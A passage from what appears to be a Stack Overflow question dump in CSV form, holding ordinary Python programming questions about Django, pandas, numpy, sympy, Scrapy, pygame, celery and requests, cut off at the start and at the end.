    return Database.Cursor.execute(self, query, params)
django.db.utils.IntegrityError: NOT NULL constraint failed: test_essai.ch2
&gt;&gt;&gt; bouh.id
&gt;&gt;&gt; bouh.ch1
'some content for ch1'
&gt;&gt;&gt; bouh.ch2
&gt;&gt;&gt;
</code></pre>

<p>Explanation: Django is not raising an error as default behavior in this simple case because in SQL empty string <code>""""</code> is not equivalent to NULL, as stated in <a href=""http://stackoverflow.com/questions/17816229/django-model-blank-false-does-not-work"">Django model blank=False does not work?</a></p>

<p>Now, if we look at ModelForm behavior, there seem to be a inconsistency in django doc:</p>

<p>According to:
 <a href=""https://docs.djangoproject.com/en/1.10/topics/forms/modelforms/#selecting-the-fields-to-use"" rel=""nofollow"">https://docs.djangoproject.com/en/1.10/topics/forms/modelforms/#selecting-the-fields-to-use</a></p>

<blockquote>
  <p>Django will prevent any attempt to save an incomplete model, so if the model does not allow the missing fields to be empty, and does not provide a default value for the missing fields, any attempt to save() a ModelForm with missing fields will fail. To avoid this failure, you must instantiate your model with initial values for the missing, but required fields:(â¦)</p>
</blockquote>

<p>a modelForm should not be saved with a missing field if there is no default value. </p>

<p>So with this ModelForm:
<code>
class EssaiModelForm(forms.ModelForm):
    class Meta:
        model = Essai
        fields = ['ch1']
</code>
A form with only one field <code>ch1</code> is generated. </p>

<ul>
<li>If <code>ch1</code> is left empty, the validation fails at <code>EssaiModelFormInstance.is_valid()</code> as expected. </li>
<li>If <code>ch1</code> contains a value, the validation succeeds even though <code>ch2</code> is still missing. Then the EssaiModelFormInstance.save() succeeds, contrary to what is claimed in django documentation. <code>ch2</code> is empty string and thus is compatible with SQL requirements (<code>NOT NULL</code>).</li>
</ul>

<p>So it seems that there is a default default value empty string <code>""""</code> for Charfield that is <strong>not accepted</strong> in form validation but that is <strong>accepted</strong> in save() validation. This may require clarification in the documentation.</p>
"
40119486,3121439.0,2016-10-18 23:08:51+00:00,3,Find cells with data and use as index in dataframe,"<p>I'm reading an excel file, but for this question purposes I will provide an example of what my dataframe looks like.
I have a <code>dataframe</code> like so:</p>

<pre><code>df = pd.DataFrame([
        ['Texas 1', '111', '222', '333'],
        ['Texas 1', '444', '555', '666'],
        ['Texas 2', '777','888','999']
    ])
df[2] = df[2].replace('222', '')


          0    1    2    3
a   Texas 1  111       333
b   Texas 1  444  555  666
c   Texas 2  777  888  999
</code></pre>

<p>And I want to be able to define a multiindex based on the values of the first row that are not blank.
So something like this:</p>

<pre><code>      0     1    3
Texas 1   111  333 444  555  666
Texas 2   111  333 777  888  999
</code></pre>

<p>The problem is that the values in row <code>a</code> will not always be in the same column, so I need a way to find which columns have a value in the first row and use that column number as an index. So far, I read my excel file like so:</p>

<pre><code>df1 = pd.read_excel('excel.XLS', index_col=[1,11,24,37])
</code></pre>

<p>And I've been looking for a way to read the cells that are not <code>NaN</code> and are in <code>row a</code> and find their column number to store in a list and use that as for my <code>index_col=()</code>. But I can't figure out how. Any pointers in the right direction would be awesome!  </p>
"
39604586,2629357.0,2016-09-20 22:16:47+00:00,3,Pandas apply with list output gives ValueError once df contains timeseries,"<p>I'm trying to implement an apply function that returns two values because the calculations are similar and pretty time consuming, so I don't want to do apply twice.
The below is an MWE that is pretty stupid and I know there are easier ways to achieve what this MWE does. My actual function is more complicated, but I already run into an error with this MWE:</p>

<p>So, I got this to work:</p>

<pre><code>def function(row):
    return [row.A, row.A/2]

df = pd.DataFrame({'A' : np.random.randn(8),
                'B' : np.random.randn(8)})
df[['D','E']] = df.apply(lambda row: function(row), axis=1).apply(pd.Series)
</code></pre>

<p>However, this does not:</p>

<pre><code>df2 = pd.DataFrame({'A' : np.random.randn(8),
                'B' : pd.date_range('1/1/2011', periods=8, freq='H'),
              'C' : np.random.randn(8)})
df2[['D','E']] = df2.apply(lambda row: function(row), axis=1).apply(pd.Series)
</code></pre>

<p>Instead, it gives me 
ValueError: Shape of passed values is (8, 2), indices imply (8, 3)</p>

<p>I don't understand why changing the type of the B column would impact the outcome, it is not even used in the apply function at all?</p>

<p>I guess I could avoid this issue in the example by temporary excluding the date column. However, in my function later I will need to use the date.</p>

<p>Can someone explain me, why this example does not work? What changes by including a TS?</p>
"
40004517,5378816.0,2016-10-12 17:11:48+00:00,3,Why does bytearray_obj.extend(bytes) differ from bytearray_obj += bytes?,"<p>Just saw (and enjoyed) the video of Brandon Rhodes talking on PyCon 2015 about bytearrays.</p>

<p>He said that <code>.extend</code> method is slow, but <code>+=</code> operation is implemented differently and is much more efficient. Yes, indeed:</p>

<pre><code>&gt;&gt;&gt; timeit.timeit(setup='ba=bytearray()', stmt='ba.extend(b""xyz123"")', number=1000000)
0.19515220914036036
&gt;&gt;&gt; timeit.timeit(setup='ba=bytearray()', stmt='ba += b""xyz123""', number=1000000)
0.09053478296846151
</code></pre>

<p>What is the reason of having two ways of extending a bytearray? Are they performing exactly the same task? If not, what is the difference? Which one should be used when?</p>
"
39978893,6503966.0,2016-10-11 13:52:46+00:00,3,optimal data structure to store million of pixels in python?,"<p>I have several images and after some basic processing and contour detection I want to store the detected pixels locations and their adjacent neighbours values into a Python Data Structure. I settled for <strong>numpy.array</strong></p>

<p>The pixel locations from each Image are retrieved using:</p>

<pre><code>locationsPx = cv2.findNonZero(SomeBWImage)
</code></pre>

<p>which will return an array of the shape (NumberOfPixels,1L,2L) with :</p>

<pre><code>print(locationsPx[0]) : array([[1649,    4]])
</code></pre>

<p>for example.</p>

<p>My question is: is it possible to store this double array on a single column in another array? Or should I use a list and drop the array all together?</p>

<p><strong>note:  the dataset of images might increase so the dimensions of my chose data structure will not be only huge, but also variable</strong> </p>

<p>EDIT: or maybe numpy.array is not good idea and Pandas Dataframe is better suited? I am open to suggestion from those who have more experience in this.</p>
"
39706005,771848.0,2016-09-26 14:52:58+00:00,3,CrawlerProcess vs CrawlerRunner,"<p><a href=""http://scrapy.readthedocs.io/en/latest/topics/practices.html#run-scrapy-from-a-script"" rel=""nofollow"">Scrapy 1.x documentation</a> explains that there are two ways to <em>run a Scrapy spider from a script</em>:</p>

<ul>
<li>using <a href=""http://scrapy.readthedocs.io/en/latest/topics/api.html#scrapy.crawler.CrawlerProcess"" rel=""nofollow""><code>CrawlerProcess</code></a></li>
<li>using <a href=""http://scrapy.readthedocs.io/en/latest/topics/api.html#scrapy.crawler.CrawlerRunner"" rel=""nofollow""><code>CrawlerRunner</code></a></li>
</ul>

<p>What is the difference between the two? When should I use ""process"" and when ""runner""?</p>
"
40116219,2564199.0,2016-10-18 19:11:50+00:00,3,Sum of several columns from a pandas dataframe,"<p>So say I have the following table:</p>

<pre><code>In [2]: df = pd.DataFrame({'a': [1,2,3], 'b':[2,4,6], 'c':[1,1,1]})

In [3]: df
Out[3]: 
   a  b  c
0  1  2  1
1  2  4  1
2  3  6  1
</code></pre>

<p>I can sum a and b that way:</p>

<pre><code>In [4]: sum(df['a']) + sum(df['b'])
Out[4]: 18
</code></pre>

<p>However this is not very convenient for larger dataframe, where you have to sum multiple columns together.</p>

<p>Is there a neater way to sum columns (similar to the below)? What if I want to sum the entire DataFrame without specifying the columns?</p>

<pre><code>In [4]: sum(df[['a', 'b']]) #that will not work!
Out[4]: 18
In [4]: sum(df) #that will not work!
Out[4]: 21
</code></pre>
"
40119616,5016915.0,2016-10-18 23:23:00+00:00,3,Swap list / string around a character python,"<p>I want to swap two parts of a list or string around a specified index, example:</p>

<pre><code>([1, 2, 3, 4, 5], 2)
</code></pre>

<p>should return</p>

<pre><code>[4, 5, 3, 1, 2]
</code></pre>

<p>I'm only supposed to have one line of code, it works for strings but I get</p>

<p>can only concatenate list (not ""int"") to list</p>

<p>when I try to use lists.</p>

<pre><code>def swap(listOrString, index):

    return (listOrString[index + 1:] + listOrString[index] + listOrString[:index])
</code></pre>
"
39978527,1052440.0,2016-10-11 13:35:46+00:00,3,Simulating UDAF on Pyspark for encapsulation,"<p>I'm learning Spark with PySpark, and just hit a wall when trying to make things cleaner.</p>

<p>Say a have a dataframe that looks like this. (of course, with way more columns and rows)</p>

<pre><code>A | B |   C
--+---+------
a | 1 | 1.300
a | 2 | 2.500
a | 3 | 1.000
b | 1 | 120.0
b | 4 | 34.20
c | 2 | 3.442
</code></pre>

<p>and I want to run a bunch of <code>groupby -&gt; agg</code> on it, using basic <code>pyspark.sql.functions</code> , like <code>count()</code> and <code>mean()</code>, like this:</p>

<pre><code>df.groupby(""A"")\
    .agg(mean(""B"").alias(""B_mean""),
         sum(""C"").alias(""C_sum""),
         (countDistinct(""B"")/avg(""C"")).alias(""New_metric""))
</code></pre>

<p>It works fine, runs relatively fast, and gives me the desired results. </p>

<p>But, eventually, slightly more complex functions will be needed, and, also, we want to make these easier to test. </p>

<p>How can one encapsulate these functions? Using <code>lambda</code>? Some way around UDFs?</p>

<p>I'm aware of UDAFs and that it's possible to write them in SCALA and import the code to PySpark, but, since all of our code base is already in Python, I would like to explore other options.</p>

<p>P.S.: We are running Spark 1.6.0</p>
"
40128895,6225259.0,2016-10-19 10:34:04+00:00,3,Numpy conversion of column values in to row values,"<p>I take 3 values of a column (third) and put these values into a row on 3 new columns. And merge the new and old columns into a new matrix A</p>

<p>Input timeseries in col nr3 values in col nr 1 and 2</p>

<pre><code>[x x 1]
[x x 2]
[x x 3]
</code></pre>

<p>output : matrix A</p>

<pre><code>[x x 1 0 0 0]
[x x 2 0 0 0]
[x x 3 1 2 3]
[x x 4 2 3 4]
</code></pre>

<p>So for brevity, first the code generates the matrix 6 rows / 3 col. The last column I want to use to fill 3 extra columns and merge it into a new matrix A. This matrix A was prefilled with 2 rows to offset the starting position.</p>

<p>I have implemented this idea in the code below and it takes a really long time to process large data sets. 
How to improve the speed of this conversion </p>

<pre><code>import  numpy as np

matrix = np.arange(18).reshape((6, 3))

nr=3 
A = np.zeros((nr-1,nr))

for x in range( matrix.shape[0]-nr+1):
    newrow =  (np.transpose( matrix[x:x+nr,2:3] ))
    A = np.vstack([A , newrow])

total= np.column_stack((matrix,A))
print (total)
</code></pre>
"
39759240,6430754.0,2016-09-28 23:42:51+00:00,3,Showing characters instead of integers in arcs in OpenFST(PyFST),"<p>I'm using the method <code>linear_chain</code> to accept a <code>String</code>. When I convert it into a <code>fst binary</code> to then into a <code>DOT</code> format, I get integers instead of the characters. Also, I have a SymbolTable for each of the corresponding letters being read.</p>

<p>What I need is to show the characters instead, be by the command line or by coding directly in Python. Any help or reference would be greatly appreciated.</p>
"
39706394,5243022.0,2016-09-26 15:10:59+00:00,3,Open a file in Sublime Text and wait until it is closed while Python script is running,"<p>I want to open a file in Sublime Text while my Python script waits until I have <em>closed</em> the editor. I have tried <code>subprocess.check_call</code> and <code>subprocess.Popen</code>.  However, the call ends after the file is opened, rather than waiting for the file to close.  How can I wait until the file is closed in Sublime Text?</p>

<pre><code>p = subprocess.Popen(['subl', 'parameters.py'])
p.communicate()
</code></pre>



<pre><code>p = subprocess.check_call(['subl', 'parameters.py'])
</code></pre>
"
39979293,6476722.0,2016-10-11 14:13:37+00:00,3,"Solving a system of equation with Sympy, python2.7","<p>I want to solve a system of equations. But I want to be able to precise the value to ""get"", and as a function of ""what"".</p>

<p>To better understand, I take an exemple from <a href=""http://stackoverflow.com/questions/22156709/solving-system-of-nonlinear-equations-with-python#_=_"">here</a>, wich I modfified:</p>

<pre><code>import sympy as sp
x, y, z = sp.symbols('x, y, z')
rho, sigma, beta = sp.symbols('rho, sigma, beta')
f1 = sigma * (y - x)
f2 = x * (rho - z) - y
f3 = x * y - beta * z
print sp.solvers.solve((f1, f2, f3), (x, y, z))
</code></pre>

<p>in </p>

<pre><code>import sympy as sp
x, y, z, w = sp.symbols('x, y, z, w')
rho, sigma, beta = sp.symbols('rho, sigma, beta')
f1 = sigma * (y - x)
f2 = x * (rho - z) - y
f3 = x * y - beta * w
f4 = z - w
print sp.solvers.solve((f1, f2, f3, f4), (x, y, z))
</code></pre>

<p>So, as you can see, I replace <strong>z</strong> by <strong>w</strong> in the last equation and I add a new to precise <strong>z = w</strong>. 
But, <strong>sympy (on python 2.7) is unable to solve this new system of equation!!</strong></p>

<p><em>So my question:</em> How to get the result for x, y, z as a function of rho, sigma, beta. And more generally, how do we precise the variable ""response variable"".</p>

<p><em>I think that could be very helpfull because, often, you don't want to developp your system of equation before asking python to solve it.</em></p>

<p>In the same way, if I take a more complex example:</p>

<pre><code>import sympy as sp
x, y, z, w, u = sp.symbols('x, y, z, w, u')
rho, sigma, beta = sp.symbols('rho, sigma, beta')
f1 = sigma * (y - x)
f2 = x * (rho - u) - y
f3 = x * y - beta * w
f4 = z - w
f5 = w - u
print sp.solvers.solve((f1, f2, f3, f4, f5), (x, y, z))
</code></pre>

<p>The response I get is: </p>

<pre><code>[]
</code></pre>

<p>But as you see I have z = w = u
Son I should get the same answer!</p>
"
39779587,6761751.0,2016-09-29 20:39:31+00:00,3,Calculating the entropy of an attribute in the ID3 algorithm when a split is perfectly classified,"<p>I have been reading about the ID3 algorithm recently and it says that the best attribute to be selected for splitting should result in the maximum information gain which can be computed with the help of the entropy. </p>

<p>I have written a simple python program to compute the entropy. It is shown below:</p>

<pre><code>def _E(p, n):
    x = (p/(p+n))
    y = (n/(p+n))
    return(-1* (x*math.log2(x)) -1* (y*math.log2(y)))
</code></pre>

<p>However suppose we have a table consisting of 10 elements as follows:</p>

<p>x = [1, 0, 1, 0, 0, 0, 0, 0, 0, 0]</p>

<p>y = [1, 1, 1, 0, 1, 0, 1, 0, 1, 0]</p>

<p>Where x is the attribute and y is the class. Here P(0) = 0.8 and P(1) = 0.2. The entropy will be as follows:</p>

<p>Entropy(x) = 0.8*_E(5, 3) + 0.2*_E(2, 0)</p>

<p>However the second split P(1) is perfectly classified and this results in a math error since log2(0) is negative infinity. How is the entropy calculated in such cases?</p>
"
39620351,6696547.0,2016-09-21 15:10:50+00:00,3,Web Scraping with Javascript Contents using Python PyQt,"<p>I am now performing a task of scraping content systematically from a course list which seems to be rendered by javascript. I followed some scripts using PyQt4 on the web but failed (which I copied below). More precisely, the script works at some websites with javascript which loads content with clicking on its specific link. However, the following website (ouhk, the link I copied below in the script) does not seem to carry link for directing users to specific content, namely Programme Information, Programme Structure and Fee, etc. Instead, it uses tag containers and FTP for storing and loading information (that I found from its source code). </p>

<p>I am wondering if there is anyway to modify the following script so that I can scrape those content by using PyQt4, or I have to look for other ways to achieve this purpose?</p>

<pre><code>import sys  
from PyQt4.QtGui import *  
from PyQt4.QtCore import *  
from PyQt4.QtWebKit import *  
from lxml import html 

from bs4 import BeautifulSoup
#import urllib.request
#from urllib.parse import urljoin


#Take this class for granted.Just use result of rendering.
class Render(QWebPage):  
  def __init__(self, url):  
    self.app = QApplication(sys.argv)  
    QWebPage.__init__(self)  
    self.loadFinished.connect(self._loadFinished)  
    self.mainFrame().load(QUrl(url))  
    self.app.exec_()  

  def _loadFinished(self, result):  
    self.frame = self.mainFrame()  
    self.app.quit()  

url = 'http://www.ouhk.edu.hk/wcsprd/Satellite?pagename=OUHK/tcSchSing2014&amp;c=C_LIPACE&amp;cid=1450268562831&amp;lang=eng&amp;sch=LIP'  
r = Render(url)  
result = r.frame.toHtml()
print result
</code></pre>
"
40032632,2052889.0,2016-10-13 23:26:53+00:00,3,Why does re.VERBOSE prevent my regex pattern from working?,"<p>I want to use the following regex to get modified files from svn log, it works fine as a single line, but since it's complex, I want to use <code>re.VERBOSE</code> so that I can add comment to it, then it stopped working. What am I missing here? Thanks!</p>

<pre><code>revision='''r123456 | user | 2013-12-22 11:21:41 -0700 (Thu, 22 Dec 2013) | 1 line
Changed paths:
   A /trunk/abc/python/test/module
   A /trunk/abc/python/test/module/__init__.py
   A /trunk/abc/python/test/module/usage.py
   A /trunk/abc/python/test/module/logger.py

copied from test
'''

import re

# doesn't work
print re.search('''
            (?&lt;=Changed\spaths:\n)  
            ((\s{3}[A|M|D]\s.*\n)*)
            [(?=\n)|]       
            ''', revision, re.VERBOSE).groups()

# works
print re.search('(?&lt;=Changed\spaths:\n)((\s{3}[A|M|D]\s.*\n)*)[(?=\n)|]', revision).groups()[0]
</code></pre>

<p>The string I want to extract is: </p>

<pre><code>   A /trunk/abc/python/test/module
   A /trunk/abc/python/test/module/__init__.py
   A /trunk/abc/python/test/module/usage.py
   A /trunk/abc/python/test/module/logger.py
</code></pre>
"
39706164,6882961.0,2016-09-26 15:00:42+00:00,3,i'm trying to make a 2 players racing game with pygame and event.key don't work,"<p>I'm trying to make a 2-player racing game, and when I try to add the <code>event.key == pygame.K_LEFT</code> it says <code>AttributeError: 'Event' object has no attribute 'key'</code>.</p>

<p>I have tried many things as adding <code>()</code>, but nothing fixed it and I have no clue about it.</p>

<p>Code:</p>

<pre><code>import pygame

pygame.init()

display_width = 1280
display_height = 720

black = (0, 0, 0)
white = (255, 255, 255)
red = (255, 0, 0)
green = (0, 255, 0)
blue = (0, 0, 255)

gameDisplay = pygame.display.set_mode((display_width, display_height))
pygame.display.set_caption('U-race multiplayer')
clock = pygame.time.Clock()

car1 = pygame.image.load('car1.png')

def carone(xone, yone):
    gameDisplay.blit(car1,(xone, yone))

xone = (display_width * 0.48)
yone = (display_height * 0.8)

xone_change = 0


crashed = False

while not crashed:

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            crashed = True

        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_LEFT:
               xone_change = -5
        elif event.key == pygame.K_RIGHT:
            xone_change = 5

        if event.type == pygame.KEYUP:
            if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT:
                xone_change = 0
</code></pre>

<p>error message:</p>

<pre><code> RESTART: C:\Users\Osamas\Desktop\U-racing multiplayer\U-racing multiplayer.py 
Traceback (most recent call last):
  File ""C:\Users\Osamas\Desktop\U-racing multiplayer\U-racing multiplayer.py"", line 44, in &lt;module&gt;
    elif event.key == pygame.K_RIGHT:
AttributeError: 'Event' object has no attribute 'key'
</code></pre>
"
39627490,678572.0,2016-09-21 22:26:00+00:00,3,How to add `colorbar` to `networkx` using a `seaborn` color palette? (Python 3),"<p>I'm trying to add a <code>colorbar</code> to my <code>networkx</code> drawn <code>matplotlib ax</code> from the range of <code>1</code> (being the lightest) and <code>3</code> (being the darkest) [check out the line w/ <code>cmap</code> below]. I'm trying to combine a lot of <code>PyData</code> functionalities. </p>

<p><strong>How can I add a color bar type feature on a networkx plot using a seaborn color palette?</strong> </p>

<p><a href=""http://i.stack.imgur.com/Yt5ud.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/Yt5ud.png"" alt=""enter image description here""></a></p>

<pre><code># Set up Graph
DF_adj = pd.DataFrame(np.array(
     [[1, 0, 1, 1],
     [0, 1, 1, 0],
     [1, 1, 1, 1],
     [1, 0, 1, 1] ]), columns=['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'], index=['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'])

G = nx.Graph(DF_adj.as_matrix())
G = nx.relabel_nodes(G, dict(zip(range(4), ['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'])))

# Color mapping
color_palette = sns.cubehelix_palette(3)
cmap = {k:color_palette[v-1] for k,v in zip(['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'],[2, 1, 3, 2])}

# Draw
nx.draw(G, node_color=[cmap[node] for node in G.nodes()], with_labels=True)
</code></pre>

<p>In this, they are all using <code>matplotlib</code> color palettes: <a href=""http://jakevdp.github.io/mpl_tutorial/tutorial_pages/tut3.html"" rel=""nofollow"">http://jakevdp.github.io/mpl_tutorial/tutorial_pages/tut3.html</a>  I even tried converting them to a <code>ListedColormap</code> object but it didn't work. </p>

<p>This doesn't work for my situation either b/c matplotlib colormap: <a href=""http://stackoverflow.com/questions/30353363/seaborn-regplot-with-colorbar"">Seaborn regplot with colorbar?</a></p>

<p>Same for <a href=""http://matplotlib.org/examples/pylab_examples/colorbar_tick_labelling_demo.html"" rel=""nofollow"">http://matplotlib.org/examples/pylab_examples/colorbar_tick_labelling_demo.html</a></p>

<p>This was the closest I got but it didn't work I got a autoscale Nonetype: <a href=""http://stackoverflow.com/questions/37902459/how-do-i-use-seaborns-color-palette-as-a-colormap-in-matplotlib"">How do I use seaborns color_palette as a colormap in matplotlib?</a></p>
"
39778443,3790954.0,2016-09-29 19:25:26+00:00,3,DRY way to declare several similar form fields,"<p>Let's say I'm trying to declare a (django) Form class with several FileFields:</p>

<pre><code>class = MyForm(forms.Form):
    file_0 = forms.FileField()
    file_1 = forms.FileField()
    ...
</code></pre>

<p>I have about 20 sequential inputs to declare - what's the best way to avoid typing this all out like a chump?</p>
"
40118133,169440.0,2016-10-18 21:11:48+00:00,3,Library `requests` getting different results unpredictably,"<p>Why does this code:</p>

<pre><code>import requests


response = requests.post('http://evds.tcmb.gov.tr/cgi-bin/famecgi', data={
    'cgi': '$ozetweb',
    'ARAVERIGRUP': 'bie_yymkpyuk.db',
    'DIL': 'UK',
    'ONDALIK': '5',
    'wfmultiple_selection': 'ZAMANSERILERI',
    'f_begdt': '07-01-2005',
    'f_enddt': '07-10-2016',
    'ZAMANSERILERI': ['TP.PYUK1', 'TP.PYUK2', 'TP.PYUK21', 'TP.PYUK22', 'TP.PYUK3', 'TP.PYUK4', 'TP.PYUK5', 'TP.PYUK6'],
    'YON': '3',
    'SUBMITDEG': 'Report',
    'GRTYPE': '1',
    'EPOSTA': 'xxx',
    'RESIMPOSTA': '***',
})

print(response.text)
</code></pre>

<p>produces different results in Python 2 (<code>2.7.12</code>) and Python 3 (<code>3.5.2</code>)? I'm using <code>requests==2.11.1</code>. Since the <code>requests</code> library supports both Python versions with the same API, I guess the result should be the same.</p>

<p>The expected result is the one obtained from running the code with Python 2. It works every single time. When ran with Python 3, the server sometimes returns an error, and sometimes it works. (This is the intriguing part.)</p>

<p>Since it works with Python 2, I figure the error must happen in the client side. Is there any caveat to how Python 3 handles encoding, or sending the data through the socket, that I should be aware of?</p>

<p><strong>EDIT:</strong> In the comments below, a person was able to reproduce this and confirms this issue exists.</p>
"
39766886,1752959.0,2016-09-29 09:44:25+00:00,3,Find cells in dataframe where value is between x and y,"<p>I want all values in a pandas dataframe as True / False depending on whether the value is between the given x and y.</p>

<p>Any combining of 2 dataframes using an 'AND' operator, or any 'between' functionality from pandas would be nice. I would prefer not to loop over the columns and call the pandas.Series.between(x, y) function.</p>

<p><strong>Example</strong></p>

<p>Given the following dataframe</p>

<pre><code>&gt;&gt;&gt; df = pd.DataFrame([{1:1,2:2,3:6},{1:9,2:9,3:10}])
&gt;&gt;&gt; df
   1  2   3
0  1  2   6
1  9  9  10
</code></pre>

<p>I want all values between x and y. I can for example start with:</p>

<pre><code>&gt;&gt;&gt; df &gt; 2
       1      2     3
0  False  False  True
1   True   True  True
</code></pre>

<p>and then do </p>

<pre><code>&gt;&gt;&gt; df &lt; 10
      1     2      3
0  True  True   True
1  True  True  False
</code></pre>

<p>But then</p>

<pre><code>&gt;&gt;&gt; df &gt; 2 and df &lt; 10
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
  File ""C:\Users\Laurens Koppenol\Anaconda2\lib\site-packages\pandas\core\generic.py"", line 731, in __nonzero__
    .format(self.__class__.__name__))
ValueError: The truth value of a DataFrame is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().
</code></pre>
"
39622288,336527.0,2016-09-21 16:50:42+00:00,3,Why exhausted generators raise StopIteration more than once?,"<p>Why is it that when an exhausted generator is called several times, <code>StopIteration</code> is raised every time, rather than just on the first attempt? Aren't subsequent calls meaningless, and indicate a likely bug in the caller's code?</p>

<pre><code>def gen_func():
    yield 1
    yield 2
gen = gen_func()
next(gen)
next(gen)
next(gen) # StopIteration as expected
next(gen) # why StopIteration and not something to warn me that I'm doing something wrong
</code></pre>

<p>This also results in this behavior when someone accidentally uses an expired generator:</p>

<pre><code>def do_work(gen):
    for x in gen:
        # do stuff with x
        pass

    # here I forgot that I already used up gen
    # so the loop does nothing without raising any exception or warning
    for x in gen:
        # do stuff with x
        pass

def gen_func():
    yield 1
    yield 2

gen = gen_func()
do_work(gen)
</code></pre>

<p>If second and later attempts to call an exhausted generator raised a different exception, it would have been easier to catch this type of bugs.</p>

<p>Perhaps there's an important use case for calling exhausted generators multiple times and getting <code>StopIteration</code>?</p>
"
39696234,1260987.0,2016-09-26 06:43:14+00:00,3,Is there any Built in function for PHP Application same as compile() in python?,"<p>I am looking for the builtin function or any integrated way in Apache or Php with same working as compile() in Python  . for my PHP Application 
Is there any thing related to this ??</p>
"
40008998,7010400.0,2016-10-12 21:53:05+00:00,3,Python searching through columns,"<p>I have a CSV file that I need to loop through in a specific pattern for specific columns and have the output patterns be stored in new files with the same name + ""_pattern"" + [1,2,3,etc.] + .csv.</p>

<p>This is the search pattern: Loop through column 1 and find the same # and grab them, then loop through column 2 of the grabbed list and then grab all that have the same date in column 2, then go to column 4 and grab all #s that are NOT the same, and then create a file with the pattern from column 1 and 2 and 4 organized by column time.</p>

<p>Example: </p>

<pre class=""lang-none prettyprint-override""><code>1       2           time    4
13.45   9/29/2016   6:00    98765
12.56   9/29/2016   6:05    76548
13.45   9/29/2016   6:07    98764
13.45   9/29/2016   6:21    98766
13.45   9/29/2016   6:20    96765
12.56   9/29/2016   6:06    76553
</code></pre>

<p><a href=""https://i.stack.imgur.com/OqxcG.jpg"" rel=""nofollow"">Better view of table</a></p>

<p>The result would be, file_pattern_1.csv would have:</p>

<pre class=""lang-none prettyprint-override""><code>1. 13.45    9/29/2016   6:00    98765
2. 13.45    9/29/2016   6:07    98764
3. 13.45    9/29/2016   6:21    98766
</code></pre>

<p>But would not include:</p>

<pre class=""lang-none prettyprint-override""><code>4. 13.45    9/29/2016   6:20    96765 
</code></pre>

<p>Because column 4 repeats from a previous entry, file_pattern_2.csv would have:</p>

<pre class=""lang-none prettyprint-override""><code>1. 12.56    9/29/2016   6:05    76548
2. 12.56    9/29/2016   6:06    76553
</code></pre>

<p>This is what I have so far but I have become lost on the looping logic:</p>

<pre><code>import os

infile = raw_input(""Which file are we working with? "")
assert os.path.exists(infile), ""Path is incorrect.""
os.chdir(infile)

def createFile(csvFile, fileName):
    with open (fileName, 'wb') as ftext:
        ftext.write(csvFile)

def appendFile(csvFile, fileName):
    with open (fileName, 'a') as ftext:
        ftext.write(csvFile)

def setfilename(tread):
    fileName = tread[0:tread.index('.')] + '_patterns' + str(countItem) + '.csv'
    return fileName

for i in pcolumn:
    if pcolumn == pcolumn:
        return pfile
    for x in date:
        if date == date:
            return date
            for a in acolumn:
                if acolumn != acolumn:
                    createFile(fileName)
else:
    print ""Finished.""
</code></pre>
"
39695700,4651101.0,2016-09-26 06:06:25+00:00,3,Python Flask app- leading zeros in TOTP error. (Python 2.7),"<p>I have written a python flask application in which app generate totp for validation. (Python 2.7)</p>

<p>I use onetimepass library to validate totp against the application secret. 
code:</p>

<pre><code>    json_data=request.get_json()
    my_token=json_data['OTP']
    is_valid = otp.valid_totp(token=my_token, secret=my_secret)
</code></pre>

<p>However the issue i am facing is whenever a totp comes with leading zeroes it turns into an Octal number. 
OTP is always treated as incorrect and user is unable to login.</p>

<p>How can i preserve these leading zeroes in such case? any code snippets or guidance will be of much help.</p>
"
39624223,357578.0,2016-09-21 18:41:20+00:00,3,How to kill celery worker process for process restart,"<p>I have a celery worker process that creates one socket to an external server in <code>celery.signals.worker_process_init</code>. If the connection can't be established and an exception is raised the celery worker fails to start, which is the intended behaviour.</p>

<p>That socket class also sends occasional heartbeat packets using a <code>threading.Timer</code>. Unfortunately, because the Timer thread has no special exception handling, my worker doesn't quit if something happens to the connection.</p>

<p>I started catching exceptions from my socket read and write operations and have tried a bunch of things to gracefully stop the current worker process:</p>

<pre><code>sys.exit(1)  # Doesn't kill the worker process (because it's running in a thread?)
</code></pre>

<p>next attempt, I saw it mentioned somewhere in <code>celery/billiard</code> issues: </p>

<pre><code>raise SystemExit(""Socket error"")  # Same, I guess
</code></pre>

<p>this works:</p>

<pre><code>os.kill(os.getpid(), signal.SIGHUP)
</code></pre>

<p>BUT the celery worker supervisor process goes into a fast spin creating celery worker processes that exit immediately, instead of giving up and dying after a few attempts.</p>

<p>Is there a nicer way to signal the death of a celery worker process from outside a celery task?</p>
"
39770863,1045399.0,2016-09-29 12:51:43+00:00,3,Numpy 2D array indexing without out of bound and with clipping value,"<p>I have indices array </p>

<pre><code>a = np.array([
   [0, 0],
   [1, 1],
   [1, 9]
])
</code></pre>

<p>And 2D array</p>

<pre><code>b = np.array([
   [0, 1, 2, 3],
   [5, 6, 7, 8]
])
</code></pre>

<p>I can do this one</p>

<pre><code>b[a[:, 0], a[:, 1]]
</code></pre>

<p>But it'll be an exception '<strong>out of bounds</strong>', because 9 is out of range. 
I need a <em>very fast way</em> to make array slice by indices and it will be ideal if I can set a clip value, e.g.:</p>

<pre><code>np.indexing_with_clipping(array=b, indices=a, clipping_value=0)
&gt; array([0, 6, --&gt; 0 = clipped value &lt;--])
</code></pre>
"
40012062,7011348.0,2016-10-13 03:59:43+00:00,3,Uncapitalizing first letter of a name,"<p>To code a name like DeAnna you type:</p>

<pre><code>name = ""de\aanna"" 
</code></pre>

<p>and </p>

<pre><code>print(name.title())
</code></pre>

<p>In this code <code>\a</code> capitalizes a normally uncapitalized letter. What do you code to produce a name like <code>""George von Trapp""</code> where I want to uncapitalize a normally capitalized letter?</p>
"
40010066,6928055.0,2016-10-12 23:42:14+00:00,3,Counting number of vowels in a merged string,"<p>I am trying to figure out how to calculate the score of two merged lists of names. I need to give one point for each character (including spaces between first and last name) plus one point for each vowel in the name. I can currently calculate score for the the lengths of the names but cannot figure out how to include the number of vowels. </p>

<pre><code>a = [""John"", ""Kate"", ""Oli""]
